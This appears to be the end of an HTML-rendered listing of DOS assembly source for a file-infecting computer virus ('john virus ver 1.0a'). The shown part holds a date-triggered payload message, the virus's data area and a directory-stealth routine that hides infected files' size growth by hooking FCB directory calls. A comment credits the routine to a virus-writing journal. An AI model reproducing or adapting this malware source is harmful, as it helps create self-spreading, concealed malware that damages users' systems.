</span><span class="sc10">all</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">;  </span><span class="sc0">
                                </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">                       </span><span class="sc1">;use to set </span><span class="sc0">
</span><span class="sc6">iret</span><span class="sc0">                            </span><span class="sc1">;error flag</span><span class="sc0">

</span><span class="sc1">;***********************************************************</span><span class="sc0">
</span><span class="sc1">;         DATA AREA</span><span class="sc0">
</span><span class="sc1">;***********************************************************</span><span class="sc0">
</span><span class="sc5">largo</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">jump</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">
</span><span class="sc5">real</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">hora</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dia</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">attrib</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">int21</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc10">error</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

ÿ</span><span class="sc1">;---------------------------------</span><span class="sc0">
</span><span class="sc5">action</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;Call label      </span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2AH</span><span class="sc0">                       </span><span class="sc1">;        </span><span class="sc0">
</span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">                          </span><span class="sc1">;get date           </span><span class="sc0">
</span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">Dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">action_dia</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;is equal to my day?                 </span><span class="sc0">
</span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">cont</span><span class="sc0">                         </span><span class="sc1">;nop! fuck ret          </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">action_dia</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">32</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_day</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">cont</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">action_mes</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;is equal to my month?            </span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">set</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">action_mes</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">13</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NO_DAY</span><span class="sc0">                       </span><span class="sc1">;nop! fuck ret           </span><span class="sc0">
</span><span class="sc5">set</span><span class="sc4">:</span><span class="sc0">                             </span><span class="sc1">; </span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                         </span><span class="sc1">;yeah!!          </span><span class="sc0">
</span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PAO</span><span class="sc0">                </span><span class="sc1">;print my text!         </span><span class="sc0">
</span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">                          </span><span class="sc1">;now!   </span><span class="sc0">
</span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc0">                          </span><span class="sc1">;an finsh te program        </span><span class="sc0">
</span><span class="sc5">NO_DAY</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;label to incorrect date              </span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                              </span><span class="sc1">;return from call </span><span class="sc0">
</span><span class="sc1">;---------------------------------</span><span class="sc0">

ÿ
</span><span class="sc5">PAO</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc12">'you are infected with john virus ver 1.0a'</span><span class="sc4">,</span><span class="sc12">'$'</span><span class="sc0">

</span><span class="sc1">;*****************************************************</span><span class="sc0">
</span><span class="sc5">dir_s</span><span class="sc4">:</span><span class="sc0">                                                               
             </span><span class="sc6">pushf</span><span class="sc0">                                                         
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                                                    
             </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">a3</span><span class="sc0">                      </span><span class="sc1">;Get file Stats                       </span><span class="sc0">
             </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                   </span><span class="sc1">;Good FCB?                            </span><span class="sc0">
             </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_good</span><span class="sc0">                 </span><span class="sc1">;nope                                 </span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                 
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                                                    
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                                                    
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc0">                  </span><span class="sc1">;Is this Undocmented? huh...          </span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                                                 
             </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">                                           
             </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">                        
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                 
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">                                               
             </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                                                    
             </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                   </span><span class="sc1">;Get file DTA                         </span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                                                   
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                    
             </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">                                                    
             </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fcb_okay</span><span class="sc0">                                              
             </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">                                                 
</span><span class="sc5">fcb_okay</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">                                   
             </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1fh</span><span class="sc0">                   </span><span class="sc1">;UnMask Seconds Field                 </span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">fechad</span><span class="sc0">                                      
             </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">                                            
             </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">0e0h</span><span class="sc0">                            
             </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1dh</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">FIN</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">START</span><span class="sc0">  </span><span class="sc1">;Yes minus virus size       </span><span class="sc0">
             </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1fh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                                        
</span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                                                    
             </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                                                    
</span><span class="sc5">no_good</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">iret</span><span class="sc0">                                                          
</span><span class="sc1">;********************************************************************</span><span class="sc0">
</span><span class="sc1">; THIS DIR STEALTH METOD IS EXTRAC FROM NUKEK INFO JOURNAL 4 &amp; N-POX </span><span class="sc0">
</span><span class="sc1">;*********************************************************************</span><span class="sc0">

ÿ</span><span class="sc5">action_dia</span><span class="sc0"> </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">08H</span><span class="sc0"> </span><span class="sc1">;day for the action</span><span class="sc0">
</span><span class="sc5">action_mes</span><span class="sc0"> </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">04H</span><span class="sc0"> </span><span class="sc1">;month for the action</span><span class="sc0">
</span><span class="sc5">FECHA</span><span class="sc0"> </span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">01eH</span><span class="sc0"> </span><span class="sc1">;Secon for mark</span><span class="sc0">
</span><span class="sc5">FECHAd</span><span class="sc0"> </span><span class="sc9">Db</span><span class="sc0"> </span><span class="sc2">01eH</span><span class="sc0"> </span><span class="sc1">;Secon for mark dir st</span><span class="sc0">
</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
